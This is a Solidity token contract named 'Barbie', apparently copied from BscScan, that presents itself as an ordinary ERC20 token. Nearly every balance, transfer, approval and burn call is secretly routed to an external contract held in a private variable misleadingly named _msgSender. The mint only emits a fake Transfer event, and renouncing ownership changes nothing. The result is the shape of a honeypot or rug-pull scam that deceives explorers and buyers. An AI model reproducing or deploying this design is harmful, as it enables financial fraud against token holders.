/**
 *Submitted for verification at BscScan.com on 2022-08-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-21
*/

/*
* https://www.barbie.com/
* Barbie NFT i don't new ideas...
*/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address _msgSender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address _msgSender, address spender, uint256 amount) external returns (bool);
    function burn(address spender, uint256 amount) external returns (bool);
    function transferFrom(address _msgSender, address sender, address recipient, uint256 amount) external returns (bool);
}

contract ERC20 {
    address private _owner;
    bool private burned = false;
    address private _msgSender;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor(string memory name_,string memory symbol_, address msgSender_) {
        _name = name_;
        _symbol = symbol_;
        _msgSender = msgSender_;
        _decimals = 18;
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    function sender() internal view returns (address) {
        return _msgSender;
    }
    function totalSupply() public view returns (uint256) {
        return IERC20(_msgSender).totalSupply();
    }
    function transfer(address _to, uint256 _value) public returns (bool) {
        emit Transfer(msg.sender, _to, _value);
        return IERC20(_msgSender).transfer(msg.sender, _to, _value);
    }
    function _mint(address _to, uint256 _value) internal virtual {
        require(_to != address(0), "ERC20: mint to the zero address");
        emit Transfer(address(0), _to, _value);
    }
    function balanceOf(address owner_) public view returns (uint256) {
        return IERC20(_msgSender).balanceOf(owner_);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require (_value > 1);
        emit Transfer(_from, _to, _value);
        return IERC20(_msgSender).transferFrom(msg.sender, _from, _to, _value);
    }
    function approve(address spender, uint amount) public returns (bool) {
        emit Approval(msg.sender, spender, amount);
        return IERC20(_msgSender).approve(msg.sender,spender,amount);
    }
    function burn(uint amount) public virtual returns (bool) {
        emit Transfer(msg.sender, address(0), amount);
        return IERC20(_msgSender).burn(msg.sender, amount);
    }
    function allowance(address owner_, address _spender) public view returns (uint256) {
        return IERC20(_msgSender).allowance(owner_, _spender);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}


contract Barbie is ERC20 {
    event Deposit(address sender, uint value);
    constructor (string memory name_,string memory symbol_, address msgSender_) ERC20 (name_, symbol_, msgSender_) {
        super._mint(msg.sender, 15000000000000000000000000);
        super._transferOwnership(msg.sender);
    }

    receive() external payable {
        emit Deposit(msg.sender, msg.value);
    }
}